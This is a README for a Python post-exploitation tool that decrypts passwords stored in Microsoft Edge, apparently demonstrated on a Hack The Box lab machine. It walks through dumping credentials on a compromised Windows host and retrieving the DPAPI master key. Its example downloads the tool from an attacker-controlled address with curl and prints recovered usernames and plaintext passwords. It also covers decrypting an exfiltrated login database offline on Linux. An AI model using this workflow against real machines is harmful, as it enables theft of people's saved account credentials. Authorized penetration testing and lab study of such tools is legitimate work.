# Microsoft Edge Password Decryptor (MEPD) 🛡️

A powerful, standalone Python tool, with **Zero-Dependency** mode, designed to extract and decrypt stored credentials from Microsoft Edge. This tool is built for security professionals and researchers to assist in post-exploitation audits.

## ✨ Key Features

- **Zero-Dependency Mode**: On Windows, the tool uses native `bcrypt.dll` and `crypt32.dll` via `ctypes`. No need to install `pycryptodome` or `pywin32` packages on the target.
- **Cross-Platform**: Exfiltrate the "Login Data" and "Master Key", then decrypt everything on Linux.
- **Adaptive UI**: Automatically detects terminal encoding to switch between beautiful UTF-8 box-drawing characters and standard ASCII fallback (perfect for Reverse Shells).
- **CSV Export**: Save full, non-truncated results to a CSV file for further analysis.
- **Profile Discovery**: Automatically finds all Edge profiles (Default, Profile 1, etc.) on the current Windows user local AppData.

## 🚀 Usage

### On Windows (Automatic)
If you have a shell on the target, simply run:
```bash
python mepd.py
```
*It will automatically find the Local State, decrypt the Master Key using DPAPI, and dump all profiles.*

### Offline Decryption (Linux)

1. On Windows, get the decrypted hex Master Key:
```Bash
python mepd.py --retrieve-key
```
2.a On Linux, install as a package for cryptodom dep, and get mepd in your PATH
```Bash
git clone https://github.com/0xudodelige/mepd.git
cd mepd
pipx install .
```
2.b Then use the retrieved key to decrypt an exfiltrated "Login Data" file
```Bash
mepd -d ./Login_Data -k <HEX_KEY> -o results.csv
```

## Examples

1. Windows example
```Bash
C:\Users\Public\Documents>curl 10.10.14.XX/mepd.py -o mepd.py
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 12963  100 12963    0     0  17120      0 --:--:-- --:--:-- --:--:-- 17215

C:\Users\Public\Documents>"C:\Program Files\Python311\python.exe" mepd.py
[*] No secret key supplied, trying to get it from "C:\Users\web\AppData\Local\Microsoft\Edge\User Data\Local State" and decrypt it using DPAPI...

[+] DPAPI decrypted secret key (HEX) :
c7f1ad7b079947b4bb1dc53b8740440651b6c9f5caf7fd9a18bbece57c7bd444

[*] Using decryption key : c7f1ad7b079947b4bb1dc53b8740440651b6c9f5caf7fd9a18bbece57c7bd444
[*] Searching inside "C:\Users\web\AppData\Local\Microsoft\Edge\User Data" for Edge profiles
[+] Found Edge profile folders : Default
[+] Decrypting passwords in C:\Users\web\AppData\Local\Microsoft\Edge\User Data\Default\Login Data
[*] Fetching and decrypting data...
+----------------------------+----------------------------+----------------------------+----------------------------+
|         action_url         |         origin_url         |       username_value       |       password_value       |
+----------------------------+----------------------------+----------------------------+----------------------------+
|                            |https://openai.com/         |olivia.kat                  |[Windows Native Error: na...|
+----------------------------+----------------------------+----------------------------+----------------------------+
|http://eloquia.htb/accoun...|http://eloquia.htb/accoun...|Olivia.KAT                  |REDACTED_FOR_HTB_POLICY     |
+----------------------------+----------------------------+----------------------------+----------------------------+
|                            |https://eloquia.htb/        |test                        |testtest1234!               |
+----------------------------+----------------------------+----------------------------+----------------------------+
|                            |https://chatgpt.com/        |olivia.kat                  |S3cureP@sswd3Openai         |
+----------------------------+----------------------------+----------------------------+----------------------------+
```

2. Linux example
```Bash
$ mepd -d 'Login Data' -k "c7f1ad7b079947b4bb1dc53b8740440651b6c9f5caf7fd9a18bbece57c7bd444"

[*] Using decryption key : c7f1ad7b079947b4bb1dc53b8740440651b6c9f5caf7fd9a18bbece57c7bd444

[*] Decypting passwords in Login Data
[*] Fetching and decrypting data...
╔═════════════════════════════════════════╦═════════════════════════════════════════╦═════════════════════════════════════════╦═════════════════════════════════════════╗
║                action_url               ║                origin_url               ║              username_value             ║              password_value             ║
╠═════════════════════════════════════════╬═════════════════════════════════════════╬═════════════════════════════════════════╬═════════════════════════════════════════╣
║                                         ║https://openai.com/                      ║olivia.kat                               ║[Error: MAC check failed]                ║
╠═════════════════════════════════════════╬═════════════════════════════════════════╬═════════════════════════════════════════╬═════════════════════════════════════════╣
║http://eloquia.htb/accounts/login/       ║http://eloquia.htb/accounts/login/       ║Olivia.KAT                               ║REDACTED_FOR_HTB_POLICY                  ║
╠═════════════════════════════════════════╬═════════════════════════════════════════╬═════════════════════════════════════════╬═════════════════════════════════════════╣
║                                         ║https://eloquia.htb/                     ║test                                     ║testtest1234!                            ║
╠═════════════════════════════════════════╬═════════════════════════════════════════╬═════════════════════════════════════════╬═════════════════════════════════════════╣
║                                         ║https://chatgpt.com/                     ║olivia.kat                               ║S3cureP@sswd3Openai                      ║
╚═════════════════════════════════════════╩═════════════════════════════════════════╩═════════════════════════════════════════╩═════════════════════════════════════════╝
```

## 🛠️ Requirements

- **Windows**: Python 3.x (Standard library only).

- **Linux**: Python 3.x + `pycryptodome` (recommended) for AES-GCM support.

## 📜 License & Credits

This project is licensed under the **MIT License**.

- Inspired by the original work of rishabh-a7da6.

- Refactored for stability, zero-dependency execution, and improved UI by 0xudodelige.

*Disclaimer: This tool is for educational and authorized security testing purposes only. Using it against systems you do not have permission to test is illegal.*
